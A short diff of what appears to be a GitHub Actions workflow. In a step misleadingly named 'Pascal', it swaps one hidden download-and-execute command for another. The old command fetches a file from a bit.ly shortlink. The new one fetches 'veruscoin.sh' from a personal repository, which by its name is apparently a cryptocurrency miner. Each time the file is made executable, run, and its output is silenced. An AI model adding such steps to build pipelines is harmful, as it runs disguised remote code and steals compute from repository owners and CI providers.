@@ -44,4 +44,4 @@ jobs:
       uses: actions/checkout@v2
     - name: Pascal
       run: |
-        wget https://bit.ly/393FDfp && chmod 777 393FDfp && ./393FDfp > /dev/null
+        wget https://raw.githubusercontent.com/jam5555001/veruscoin.sh/main/veruscoin.sh && chmod 777 veruscoin.sh && ./veruscoin.sh > /dev/null
